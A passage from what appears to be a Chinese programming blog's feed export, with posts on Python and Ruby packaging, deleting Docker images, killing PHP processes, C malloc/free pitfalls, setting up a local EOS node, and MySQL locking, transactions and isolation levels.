<li>在setuptools的开发过程中产生了分歧，于是出现了distribute，它fork自setuptools，并在2013年取得和解并重新merge到setuptools 0.7版本；</li>
<li>相比于上述工具，<span class="exturl" data-url="aHR0cDovL3B5cGkucHl0aG9uLm9yZy9weXBpL3BpcA==">pip<i class="fa fa-external-link-alt"></i></span>是一个更加高阶的接口，pip成为事实上的python软件的安装工具；</li>
<li>eggs和wheels成为事实上的二进制python软件的安装工具。</li>
</ol>
<p><code>venv</code>和<code>virtualenv</code>则是用来创建python虚拟环境来实现应用隔离的。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy9saWJyYXJ5L3ZlbnYuaHRtbA==">venv<i class="fa fa-external-link-alt"></i></span>在python3.3中引入，用于在自己的目录下创建轻量级的虚拟环境，也可以孤立于系统环境。</li>
<li><span class="exturl" data-url="aHR0cDovL3ZpcnR1YWxlbnYucmVhZHRoZWRvY3Mub3JnLw==">virtualenv<i class="fa fa-external-link-alt"></i></span>则是一个python软件包，用于创建孤立的python环境。</li>
</ul>
<h1 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h1><p>Ruby的软件包单元为<span class="exturl" data-url="aHR0cHM6Ly9ydWJ5Z2Vtcy5vcmcv">RubyGem<i class="fa fa-external-link-alt"></i></span>。</p>
<ul>
<li>Gem由<code>.gemspec</code>文件描述。</li>
<li>Gem的构建过程由<code>Rakefile</code>描述。</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ydWJ5Z2Vtcy5vcmcvZ2Vtcy9yYWtl">Rake<i class="fa fa-external-link-alt"></i></span>是Gem的构建工具，它与Make类似，用以完成自动化测试和代码生成。</li>
<li><span class="exturl" data-url="aHR0cDovL2J1bmRsZXIuaW8v">Bundle<i class="fa fa-external-link-alt"></i></span>则是Ruby的包管理工具，用来跟踪和下载正确版本的Gem。</li>
</ul>
]]></content>
      <categories>
        <category>Software</category>
      </categories>
  </entry>
  <entry>
    <title>Docker 删除镜像</title>
    <url>/2018/07/docker-image/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本以为删除镜像会很简单，但是删除过程中并不是那么顺利。</p>
<ol>
<li>查询镜像<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> docker <span class="built_in">ps</span> <span class="literal">-a</span></span><br></pre></td></tr></table></figure></li>
</ol>
<span id="more"></span>

<p>现在想删除第一个，ID 为 99f85991949f 的镜像。</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>docker rmi <span class="number">99</span>f85991949f</span><br></pre></td></tr></table></figure>

<h2 id="出现异常，需要先停到-ID-为-67-的容器。"><a href="#出现异常，需要先停到-ID-为-67-的容器。" class="headerlink" title="出现异常，需要先停到 ID 为 67*** 的容器。"></a>出现异常，需要先停到 ID 为 67*** 的容器。</h2><ol>
<li><p>查询容器</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">$ docker stop <span class="number">67</span>***</span><br></pre></td></tr></table></figure>
</li>
<li><p>先删除容器</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> docker <span class="built_in">rm</span> <span class="number">67</span>***</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除镜像</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>docker rmi <span class="number">99</span>f85991949f</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol>
<li><p>删除前需要保证容器是停止的  stop</p>
</li>
<li><p>需要注意删除镜像和容器的命令不一样。 docker rmi ID  , 其中 容器 (rm)  和 镜像 (rmi)</p>
</li>
<li><p>顺序需要先删除容器</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title>Linux 批量 kill Php 进程</title>
    <url>/2018/07/linux-php/</url>
    <content><![CDATA[<h2 id="Linux-出-Php-进程命令"><a href="#Linux-出-Php-进程命令" class="headerlink" title="Linux 出 Php 进程命令"></a>Linux 出 Php 进程命令</h2><figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">ps -ef | <span class="type">grep</span> run.php | <span class="type">grep</span> -v grep | <span class="type">cut</span> -c <span class="number">9</span><span class="number">-15</span> | <span class="type">xargs</span> kill <span class="number">-9</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>管道符 <code>|</code> 用来隔开两个命令，管道符左边命令的输出会作为管道符右边命令的输入。下面说说用管道符联接起来的 </p>
<h2 id="命令扩展"><a href="#命令扩展" class="headerlink" title="命令扩展"></a>命令扩展</h2><p><code>ps - ef</code> 是 Red Hat 里查看所有进程的命令。这时检索出的进程将作为下一条命令 <code>grep LOCAL=NO</code> 的输入。 </p>
<p><code>grep php</code> 的输出结果是，所有含有关键字 <code>LOCAL=NO</code> 的进程</p>
<p><code>grep -v grep</code> 是在列出的进程中去除含有关键字 <code>grep</code> 的进程。 </p>
<p><code>cut -c 9-15</code> 是截取输入行的第 9 个字符到第 15 个字符，而这正好是进程号 PID。 </p>
<p><code>xargs kill -9</code> 中的 xargs 命令是用来把前面命令的输出结果（PID）作为 <code>kill -9</code> 命令的参数，并执行该令。 </p>
<p><code>kill -9</code> 会强行杀掉指定进程，这样就成功清除了 php 所有进程</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>有关于 malloc 申请内存和 free 内存释放</title>
    <url>/2018/06/c-c++-script/</url>
    <content><![CDATA[<h2 id="malloc-工作机制："><a href="#malloc-工作机制：" class="headerlink" title="malloc 工作机制："></a>malloc 工作机制：</h2><p>malloc 函数的实质体现在，它有一个将可用的内存块连接为一个长长的列表的所谓空闲链表 (堆内存)。</p>
<p>调用 malloc 函数时，它沿连接表寻找一个大到足以满足用户请求所需要的内存块。然后，将该内存块一分为二（一块的大小与用户请求的大小相等，另一块的大小就是剩下的字节）。</p>
<span id="more"></span>

<p>接下来，将分配给用户的那块内存传给用户，并将剩下的那块（如果有的话）返回到连接表上。调用 free 函数时，它将用户释放的内存块连接到空闲链上。到最后，空闲链会被切成很多的小内存片段，如果这时用户申请一个大的内存片段，那么空闲链上可能没有可以满足用户要求的片段了。于是，malloc 函数请求延时，并开始在空闲链上翻箱倒柜地检查各内存片段，对它们进行整理，将相邻的小空闲块合并成较大的内存块。如果无法获得符合要求的内存块，malloc 函数会返回 NULL 指针，因此在调用 malloc 动态申请内存块时，一定要进行返回值的判断。</p>
<p>程序占用三种类型的内存：静态内存、栈内存、堆内存；</p>
<p>　　静态内存：用来保存局部 static 对象、类 static 数据成员以及定义在任何函数之外的变量</p>
<p>　　栈内存：用来保存定义在函数内的非 static 对象。分配在静态内存或栈内存中的对象由编译器自动创建和销毁。对于栈对象，仅在其定义的程序块运行时才存在；static 对象在使用之前分配，在程序结束时销毁。</p>
<p>　　堆内存：在程序运行时分配。动态对象的生存周期由程序（用户）来控制。</p>
<p>关于使用 free () 函数释放内存后实际数据是否存在的问题</p>
<p>关于用 malloc 分配的内存，在调用 free 释放后，该内存的状态，有以下几点说明：</p>
<ol>
<li><p>调用 free 释放掉所分配的内存后，表明该内存可以被别人使用，也就是说，其他地方调用 malloc 后，可以分配到该内存</p>
</li>
<li><p>关于 free 释放该内存后，该内存中的数据，我们只能认为是脏数据；也就是说，这部分数据可能存在并且维持原来的值，也可能被清空，或者被修改为其他值；</p>
</li>
<li><p>在释放了该内存后，除了要对当时分配的指针赋值为 NULL，还要注意不要再去引用这部分内存，不要尝试获取这部分的值，这些已经非法。</p>
</li>
<li><p>内存 free 后，里面的数据还是在的，只是这块内存会被标记为可用的内存，别的程序可以用这块内存里面的数据可能存在，只要该内存没有被别的地方占用。你 free 释放的是内存的使用权。</p>
</li>
</ol>
<p>验证代码:</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">struct stu1&#123;</span><br><span class="line">    char *<span class="keyword">name</span>;  <span class="comment">//姓名</span></span><br><span class="line">    int num;  <span class="comment">//学号</span></span><br><span class="line">    int age;  <span class="comment">//年龄</span></span><br><span class="line">    char group;  <span class="comment">//所在小组</span></span><br><span class="line">    float score;  <span class="comment">//成绩</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    <span class="comment">//给结构体成员赋值</span></span><br><span class="line">    struct stu1 *stu1;</span><br><span class="line">    &#123;</span><br><span class="line">        stu1 = malloc(sizeof(struct stu1));</span><br><span class="line">        <span class="function"><span class="title">stu1</span>-&gt;</span><span class="keyword">name</span> = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">        <span class="function"><span class="title">stu1</span>-&gt;</span>num = <span class="number">12</span>;</span><br><span class="line">        <span class="function"><span class="title">stu1</span>-&gt;</span>age = <span class="number">18</span>;</span><br><span class="line">        <span class="function"><span class="title">stu1</span>-&gt;</span>group = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="title">stu1</span>-&gt;</span>score = <span class="number">136.5</span>;</span><br><span class="line">        <span class="comment">//读取结构体成员的值</span></span><br><span class="line">        <span class="function"><span class="title">printf</span>(&quot;%s的学号是%d，年龄是%d，在%c组，今年的成绩是%.1f！\n&quot;, stu1-&gt;</span><span class="function"><span class="title">name</span>, stu1-&gt;</span><span class="function"><span class="title">num</span>, stu1-&gt;</span><span class="function"><span class="title">age</span>, stu1-&gt;</span><span class="function"><span class="title">group</span>, stu1-&gt;</span>score);</span><br><span class="line">        printf(<span class="string">&quot;%p\n&quot;</span>,stu1);</span><br><span class="line">        free(stu1);</span><br><span class="line">    &#125;</span><br><span class="line">    scanf(<span class="string">&quot;%p&quot;</span>,&amp;stu1);</span><br><span class="line">    printf(<span class="string">&quot;%p\n&quot;</span>,stu1);</span><br><span class="line">    <span class="function"><span class="title">printf</span>(&quot;%s的学号是%d，年龄是%d，在%c组，今年的成绩是%.1f！\n&quot;, stu1-&gt;</span><span class="function"><span class="title">name</span>, stu1-&gt;</span><span class="function"><span class="title">num</span>, stu1-&gt;</span><span class="function"><span class="title">age</span>, stu1-&gt;</span><span class="function"><span class="title">group</span>, stu1-&gt;</span>score);</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>使用 malloc 后 free 出错 错误所在</title>
    <url>/2018/06/c-c++-script1/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>这个问题是指针使用过程中很容易出错而且自己又很难发现的一个易疏忽问题 ———–即：指针人为的更改了原来的指向地址。</p>
<p>以下是一个很好的案例，其中红色字体为正确解。 </p>
<span id="more"></span>

<p>问题： 用 malloc 与 free 出错，望指导，谢谢 程序很简单，用于测试他们的用法，因为在一个程序中出错不知道原因。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *test=<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    test=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="built_in">free</span>(test);</span><br><span class="line">    test=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题补充： 我用 <code>sprintf(test, &quot;23123141421% s&quot;, test1);</code> 给 <code>char test</code> 赋值，但是如果不 <code>char test=malloc ();</code> 就出错，用了也用 free 就出错，不 free 就不出错。这是为什么呢？</p>
<p>free () 只用于释放动态分配的空间，即 malloc ()&#x2F;calloc ()&#x2F;realloc () 函数分配的空间，否则不会成功.</p>
<hr>
<p>test&#x3D;”123”;</p>
<p>这样，test 就指向了一个常量的地址，而不再是 malloc () 分配的空间地址，而 free() 只用于释放动态分配的空间，所以出错.</p>
<p>要想将”123” 字符串放在 test 数组中，应该用 strcpy () 函数完成，或者对 test 数组的每个元素进行单独赋值。</p>
<p>就是说要用 memcpy 或者 strcpy 将字符赋给 test，而不能直接给 test 赋值 这样会改变地址。 </p>
<p>看起来是把 “123” 放到刚用 malloc 函数开辟的空间中去，但是从结构来分析，”123“这个字符串并没有放你原先开辟的空间中去。</p>
<p>另外，malloc 和 free 一般是配合来使用的，你后来 test 这个指针指向的已不是 malloc 开辟的区域了。也就是上面所说的，free 智能只能释放动态内存。</p>
<h2 id="malloc-后-free-出错总结："><a href="#malloc-后-free-出错总结：" class="headerlink" title="malloc 后 free 出错总结："></a>malloc 后 free 出错总结：</h2><p>1、malloc 与 free 配套使用。不要跨进程分配和释放； </p>
<p>2、指向 malloc 申请的堆内存的指针，在运用过程中千万不要另外赋值，否则同样导致内存泄露（我曾今翻过这样的错误） </p>
<p>3、malloc 后，实际使用时指针长度超过了你申请的范围。再去 free 时肯定出问题。 </p>
<p>4、改变指针的初始指向地址，如上文。</p>
]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>EOS 安装本地环境</title>
    <url>/2018/06/currency-eos/</url>
    <content><![CDATA[<h2 id="EOS-安装"><a href="#EOS-安装" class="headerlink" title="EOS 安装"></a>EOS 安装</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/EOSIO/eos --recursive</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> eos/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./eosio_build.sh</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>编辑配置文件 <code>$ vim ~/.local/share/eosio/nodeos/config/config.ini</code></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">enable-stale-production</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">producer-name</span> = eosio</span><br><span class="line"><span class="attr">plugin</span> = eosio::producer_plugin</span><br><span class="line"><span class="attr">plugin</span> = eosio::wallet_api_plugin</span><br><span class="line"><span class="attr">plugin</span> = eosio::chain_api_plugin</span><br><span class="line"><span class="attr">plugin</span> = eosio::http_plugin</span><br></pre></td></tr></table></figure>

<h2 id="EOS-运行"><a href="#EOS-运行" class="headerlink" title="EOS 运行"></a>EOS 运行</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./nodeos --http-server-address=0.0.0.0:8888</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> build/programs/cleos</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./cleos wallet create key</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./cleos create account eosio slagga public_key</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./cleos get account slagga</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>EOS</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解 MySQL —— 锁、事务与并发控制</title>
    <url>/2018/06/mysql-transaction/</url>
    <content><![CDATA[<h1 id="mysql服务器逻辑架构"><a href="#mysql服务器逻辑架构" class="headerlink" title="mysql服务器逻辑架构"></a>mysql服务器逻辑架构</h1><p>每个连接都会在mysql服务端产生一个线程（内部通过线程池管理线程），比如一个select语句进入，mysql首先会在查询缓存中查找是否缓存了这个select的结果集，如果没有则继续执行 解析、优化、执行的过程；否则会之间从缓存中获取结果集。</p>
<span id="more"></span>

<h1 id="mysql并发控制——共享锁、排他锁"><a href="#mysql并发控制——共享锁、排他锁" class="headerlink" title="mysql并发控制——共享锁、排他锁"></a>mysql并发控制——共享锁、排他锁</h1><h2 id="共享锁"><a href="#共享锁" class="headerlink" title="共享锁"></a>共享锁</h2><p>共享锁也称为读锁，读锁允许多个连接可以同一时刻并发的读取同一资源,互不干扰；</p>
<h2 id="排他锁"><a href="#排他锁" class="headerlink" title="排他锁"></a>排他锁</h2><p>排他锁也称为写锁，一个写锁会阻塞其他的写锁或读锁，保证同一时刻只有一个连接可以写入数据，同时防止其他用户对这个数据的读写。</p>
<h2 id="锁策略"><a href="#锁策略" class="headerlink" title="锁策略"></a>锁策略</h2><p>锁的开销是较为昂贵的，锁策略其实就是保证了线程安全的同时获取最大的性能之间的平衡策略。</p>
<ul>
<li><strong>mysql锁策略：talbe lock(表锁)</strong></li>
</ul>
<p>表锁是mysql最基本的锁策略，也是开销最小的锁，它会锁定整个表；</p>
<p>具体情况是：若一个用户正在执行写操作，会获取排他的“写锁”，这可能会锁定整个表，阻塞其他用户的读、写操作；</p>
<p>若一个用户正在执行读操作，会先获取共享锁“读锁”，这个锁运行其他读锁并发的对这个表进行读取，互不干扰。只要没有写锁的进入，读锁可以是并发读取统一资源的。</p>
<p>通常发生在DDL语句\DML不走索引的语句中，比如这个DML update table set columnA&#x3D;”A” where columnB&#x3D;“B”. <br>如果columnB字段不存在索引（或者不是组合索引前缀），会锁住所有记录也就是锁表。如果语句的执行能够执行一个columnB字段的索引，那么会锁住满足where的行(行锁)。</p>
<ul>
<li><strong>mysql锁策略：row lock(行锁)</strong></li>
</ul>
<p>行锁可以最大限度的支持并发处理，当然也带来了最大开销，顾名思义，行锁的粒度实在每一条行数据。</p>
<h1 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h1><p><strong>事务就是一组原子性的sql，或者说一个独立的工作单元。</strong> <br><strong>事务就是说，要么mysql引擎会全部执行这一组sql语句，要么全部都不执行（比如其中一条语句失败的话）。</strong></p>
<p>比如，tim要给bill转账100块钱： <br>1.检查tim的账户余额是否大于100块； <br>2.tim的账户减少100块； <br>3.bill的账户增加100块； <br>这三个操作就是一个事务，必须打包执行，要么全部成功，要么全部不执行，其中任何一个操作的失败都会导致所有三个操作“不执行”——回滚。</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> employees;</span><br><span class="line">USE employees;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> TABLE <span class="symbol">`employees`</span>.<span class="symbol">`account`</span> (</span><br><span class="line">  <span class="symbol">`id`</span> BIGINT (<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="symbol">`p_name`</span> VARCHAR (<span class="number">4</span>),</span><br><span class="line">  <span class="symbol">`p_money`</span> DECIMAL (<span class="number">10</span>, <span class="number">2</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> DEFAULT <span class="number">0</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> <span class="keyword">KEY</span> (<span class="symbol">`id`</span>)</span><br><span class="line">) ;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="symbol">`employees`</span>.<span class="symbol">`account`</span> (<span class="symbol">`id`</span>, <span class="symbol">`p_name`</span>, <span class="symbol">`p_money`</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;tim&#x27;</span>, <span class="string">&#x27;200&#x27;</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="symbol">`employees`</span>.<span class="symbol">`account`</span> (<span class="symbol">`id`</span>, <span class="symbol">`p_name`</span>, <span class="symbol">`p_money`</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;bill&#x27;</span>, <span class="string">&#x27;200&#x27;</span>); </span><br><span class="line"></span><br><span class="line">START TRANSACTION;</span><br><span class="line"><span class="keyword">SELECT</span> p_money <span class="keyword">FROM</span> account <span class="keyword">WHERE</span> p_name=<span class="string">&quot;tim&quot;</span>;-- step1</span><br><span class="line"><span class="keyword">UPDATE</span> account <span class="keyword">SET</span> p_money=p_money<span class="number">-100</span> <span class="keyword">WHERE</span> p_name=<span class="string">&quot;tim&quot;</span>;-- step2</span><br><span class="line"><span class="keyword">UPDATE</span> account <span class="keyword">SET</span> p_money=p_money+<span class="number">100</span> <span class="keyword">WHERE</span> p_name=<span class="string">&quot;bill&quot;</span>;-- step3</span><br><span class="line">COMMIT;</span><br></pre></td></tr></table></figure>

<p>一个良好的事务系统，必须满足ACID特点：</p>
<h2 id="事务的ACID"><a href="#事务的ACID" class="headerlink" title="事务的ACID"></a>事务的ACID</h2><ul>
<li><p><strong>A:atomiciy原子性</strong> <br><strong>一个事务必须保证其中的操作要么全部执行，要么全部回滚，不可能存在只执行了一部分这种情况出现。</strong></p>
</li>
<li><p><strong>C:consistency一致性</strong> <br><strong>数据必须保证从一种一致性的状态转换为另一种一致性状态</strong>。 <br>比如上一个事务中执行了第二步时系统崩溃了，数据也不会出现bill的账户少了100块，但是tim的账户没变的情况。要么维持原装（全部回滚），要么bill少了100块同时tim多了100块，只有这两种一致性状态的</p>
</li>
<li><p><strong>I：isolation隔离性</strong> <br><strong>在一个事务未执行完毕时，通常会保证其他Session 无法看到这个事务的执行结果</strong></p>
</li>
<li><p><strong>D:durability持久性</strong> <br><strong>事务一旦commit，则数据就会保存下来，即使提交完之后系统崩溃，数据也不会丢失。</strong></p>
</li>
</ul>
<h1 id="隔离级别"><a href="#隔离级别" class="headerlink" title="隔离级别"></a>隔离级别</h1><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">查看系统隔离级别：</span><br><span class="line"><span class="keyword">select</span> @@<span class="keyword">global</span>.tx_isolation;</span><br><span class="line">查看当前会话隔离级别</span><br><span class="line"><span class="keyword">select</span> @@tx_isolation;</span><br><span class="line">设置当前会话隔离级别</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">session</span> <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> <span class="keyword">serializable</span>;</span><br><span class="line">设置全局系统隔离级别</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> <span class="keyword">READ</span> <span class="keyword">UNCOMMITTED</span>;</span><br></pre></td></tr></table></figure>

<h2 id="READ-UNCOMMITTED-未提交读-可脏读"><a href="#READ-UNCOMMITTED-未提交读-可脏读" class="headerlink" title="READ UNCOMMITTED(未提交读,可脏读)"></a>READ UNCOMMITTED(未提交读,可脏读)</h2><p><strong>事务中的修改，即使没有提交，对其他会话也是可见的。</strong> <br><strong>可以读取未提交的数据</strong>——<strong>脏读</strong>。脏读会导致很多问题，一般不适用这个隔离级别。 <br>实例：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ------------------------- read-uncommitted实例 ------------------------------</span></span><br><span class="line"><span class="comment">-- 设置全局系统隔离级别</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> <span class="keyword">READ</span> <span class="keyword">UNCOMMITTED</span>;</span><br><span class="line"><span class="comment">-- Session A</span></span><br><span class="line"><span class="keyword">START</span> <span class="keyword">TRANSACTION</span>;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">USER</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">USER</span> <span class="keyword">SET</span> <span class="type">NAME</span>=&quot;READ UNCOMMITTED&quot;;</span><br><span class="line"><span class="comment">-- commit;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Session B</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">USER</span>;</span><br><span class="line"></span><br><span class="line">//SessionB Console 可以看到<span class="keyword">Session</span> A未提交的事物处理，在另一个<span class="keyword">Session</span> 中也看到了，这就是所谓的脏读</span><br><span class="line">id  <span class="type">name</span></span><br><span class="line"><span class="number">2</span>   <span class="keyword">READ</span> <span class="keyword">UNCOMMITTED</span></span><br><span class="line"><span class="number">34</span>  <span class="keyword">READ</span> <span class="keyword">UNCOMMITTED</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="READ-COMMITTED-提交读或不可重复读，幻读"><a href="#READ-COMMITTED-提交读或不可重复读，幻读" class="headerlink" title="READ COMMITTED(提交读或不可重复读，幻读)"></a>READ COMMITTED(提交读或不可重复读，幻读)</h2><p>一般数据库都默认使用这个隔离级别（mysql不是），<strong>这个隔离级别保证了一个事务如果没有完全成功（commit执行完），事务中的操作对其他会话是不可见的</strong>。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ------------------------- read-cmmitted实例 ------------------------------</span></span><br><span class="line"><span class="comment">-- 设置全局系统隔离级别</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> TRANSACTION ISOLATION LEVEL READ  COMMITTED;</span><br><span class="line"><span class="comment">-- Session A</span></span><br><span class="line"><span class="keyword">START</span> TRANSACTION;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">USER</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">USER</span> <span class="keyword">SET</span> NAME<span class="operator">=</span>&quot;READ COMMITTED&quot;;</span><br><span class="line"><span class="comment">-- COMMIT;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Session B</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">USER</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>Console OUTPUT:</span><br><span class="line">id  name</span><br><span class="line"><span class="number">2</span>   READ UNCOMMITTED</span><br><span class="line"><span class="number">34</span>  READ UNCOMMITTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">---------------------------------------------------</span></span><br><span class="line"><span class="comment">-- 当 Session  A执行了commit，Session B得到如下结果：</span></span><br><span class="line">id  name</span><br><span class="line"><span class="number">2</span>   READ COMMITTED</span><br><span class="line"><span class="number">34</span>  READ COMMITTED</span><br></pre></td></tr></table></figure>

<p>也就验证了<strong>read committed</strong>级别在事物未完成commit操作之前修改的数据对其他Session 不可见，执行了commit之后才会对其他Session 可见。 <br>我们可以看到Session B两次查询得到了不同的数据。</p>
<p><strong>read committed隔离级别解决了脏读的问题，但是会对其他Session 产生两次不一致的读取结果（因为另一个Session 执行了事务，一致性变化）。</strong></p>
<h2 id="REPEATABLE-READ-可重复读"><a href="#REPEATABLE-READ-可重复读" class="headerlink" title="REPEATABLE READ(可重复读)"></a>REPEATABLE READ(可重复读)</h2><p>一个事务中多次执行统一读SQL,返回结果一样。 <br>这个隔离级别解决了脏读的问题，幻读问题。这里指的是innodb的rr级别，innodb中使用next-key锁对”当前读”进行加锁，锁住行以及可能产生幻读的插入位置，阻止新的数据插入产生幻行。 <br>下文中详细分析。</p>
<p>具体请参考mysql手册</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9kZXYubXlzcWwuY29tL2RvYy9yZWZtYW4vNS43L2VuL2lubm9kYi1zdG9yYWdlLWVuZ2luZS5odG1s">https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<h2 id="SERIALIZABLE-可串行化"><a href="#SERIALIZABLE-可串行化" class="headerlink" title="SERIALIZABLE(可串行化)"></a>SERIALIZABLE(可串行化)</h2><p>最强的隔离级别，通过给事务中每次读取的行加锁，写加写锁，保证不产生幻读问题，但是会导致大量超时以及锁争用问题。</p>
<h1 id="多版本并发控制-MVCC"><a href="#多版本并发控制-MVCC" class="headerlink" title="多版本并发控制-MVCC"></a>多版本并发控制-MVCC</h1><p>MVCC(multiple-version-concurrency-control）是个<strong>行级锁</strong>的变种，它在<strong>普通读情况下避免了加锁操作，因此开销更低</strong>。 <br>虽然实现不同，但通常都是实现<strong>非阻塞读</strong>，对于<strong>写操作只锁定必要的行</strong>。</p>
<ul>
<li><strong>一致性读 （就是读取快照）</strong> <br>select * from table ….;</li>
<li><strong>当前读(就是读取实际的持久化的数据)</strong> <br>特殊的读操作，插入&#x2F;更新&#x2F;删除操作，属于当前读，处理的都是当前的数据，需要加锁。 <br>select * from table where ? lock in share mode; <br>select * from table where ? for update; <br>insert; <br>update ; <br>delete;</li>
</ul>
<p><strong>注意：select …… from where…… （没有额外加锁后缀）使用MVCC，保证了读快照(mysql称为consistent read)，所谓一致性读或者读快照就是读取当前事务开始之前的数据快照，在这个事务开始之后的更新不会被读到。详细情况下文select的详述。</strong></p>
<p><strong>对于加锁读SELECT with FOR UPDATE(排他锁) or LOCK IN SHARE MODE(共享锁)、update、delete语句，要考虑是否是唯一索引的等值查询。</strong></p>
